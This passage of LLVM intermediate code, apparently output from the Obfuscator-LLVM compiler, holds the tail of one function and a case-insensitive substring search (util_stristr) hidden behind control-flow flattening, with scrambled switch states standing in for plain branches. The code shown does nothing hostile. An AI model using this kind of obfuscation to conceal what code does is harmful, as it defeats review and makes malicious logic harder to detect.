  store i32 0, i32* %11, align 4
  store i32 -1937946273, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 948513119, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %10, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %10, align 4
  store i32 -240027860, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 -1, i32* %5, align 4
  store i32 -436721368, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %5, align 4
  ret i32 %55

loopEnd:                                          ; preds = %53, %50, %49, %48, %47, %44, %38, %23, %18, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_stristr(i8*, i32, i8*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %5, align 8
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %7, align 8
  %15 = call i32 @util_strlen(i8* %14)
  store i32 %15, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -765940726, i32* %switchVar
  %.reg2mem = alloca i32
  %.reg2mem2 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -765940726, label %16
    i32 -770119107, label %21
    i32 1522332363, label %34
    i32 231717173, label %39
    i32 1783652618, label %43
    i32 103716708, label %46
    i32 -2077551170, label %52
    i32 2036260848, label %57
    i32 1898805653, label %61
    i32 -2086906065, label %64
    i32 -333817767, label %72
    i32 1953718733, label %78
    i32 2024567933, label %85
    i32 1141371271, label %86
    i32 -627024343, label %87
    i32 -672184865, label %88
    i32 1603058768, label %89
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %6, align 4
  %18 = add nsw i32 %17, -1
  store i32 %18, i32* %6, align 4
  %19 = icmp sgt i32 %17, 0
  %20 = select i1 %19, i32 -770119107, i32 -672184865
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %8, align 8
  %23 = getelementptr inbounds i8, i8* %22, i32 1
  store i8* %23, i8** %8, align 8
  %24 = load i8, i8* %22, align 1
  store i8 %24, i8* %11, align 1
  %25 = load i8*, i8** %7, align 8
  %26 = load i32, i32* %10, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i8, i8* %28, align 1
  store i8 %29, i8* %12, align 1
  %30 = load i8, i8* %11, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp sge i32 %31, 65
  %33 = select i1 %32, i32 1522332363, i32 1783652618
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i8, i8* %11, align 1
  %36 = sext i8 %35 to i32
  %37 = icmp sle i32 %36, 90
  %38 = select i1 %37, i32 231717173, i32 1783652618
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8, i8* %11, align 1
  %41 = sext i8 %40 to i32
  %42 = or i32 %41, 96
  store i32 103716708, i32* %switchVar
  store i32 %42, i32* %.reg2mem
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8, i8* %11, align 1
  %45 = sext i8 %44 to i32
  store i32 103716708, i32* %switchVar
  store i32 %45, i32* %.reg2mem
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload = load i32, i32* %.reg2mem
  %47 = trunc i32 %.reload to i8
  store i8 %47, i8* %11, align 1
  %48 = load i8, i8* %12, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp sge i32 %49, 65
  %51 = select i1 %50, i32 -2077551170, i32 1898805653
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i8, i8* %12, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp sle i32 %54, 90
  %56 = select i1 %55, i32 2036260848, i32 1898805653
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8, i8* %12, align 1
  %59 = sext i8 %58 to i32
  %60 = or i32 %59, 96
  store i32 -2086906065, i32* %switchVar
  store i32 %60, i32* %.reg2mem2
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i8, i8* %12, align 1
  %63 = sext i8 %62 to i32
  store i32 -2086906065, i32* %switchVar
  store i32 %63, i32* %.reg2mem2
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  %65 = trunc i32 %.reload3 to i8
  store i8 %65, i8* %12, align 1
  %66 = load i8, i8* %11, align 1
  %67 = sext i8 %66 to i32
  %68 = load i8, i8* %12, align 1
  %69 = sext i8 %68 to i32
  %70 = icmp eq i32 %67, %69
  %71 = select i1 %70, i32 -333817767, i32 1141371271
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %10, align 4
  %75 = load i32, i32* %9, align 4
  %76 = icmp eq i32 %74, %75
  %77 = select i1 %76, i32 1953718733, i32 2024567933
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %8, align 8
  %80 = load i8*, i8** %5, align 8
  %81 = ptrtoint i8* %79 to i64
  %82 = ptrtoint i8* %80 to i64
  %83 = sub i64 %81, %82
  %84 = trunc i64 %83 to i32
  store i32 %84, i32* %4, align 4
  store i32 1603058768, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  store i32 -627024343, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 -627024343, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 -765940726, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 -1, i32* %4, align 4
  store i32 1603058768, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i32, i32* %4, align 4
  ret i32 %90

loopEnd:                                          ; preds = %88, %87, %86, %85, %78, %72, %64, %61, %57, %52, %46, %43, %39, %34, %21, %16, %switchDefault
  br label %loopEntry
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846902}
!2 = !{i32 -2146846493}
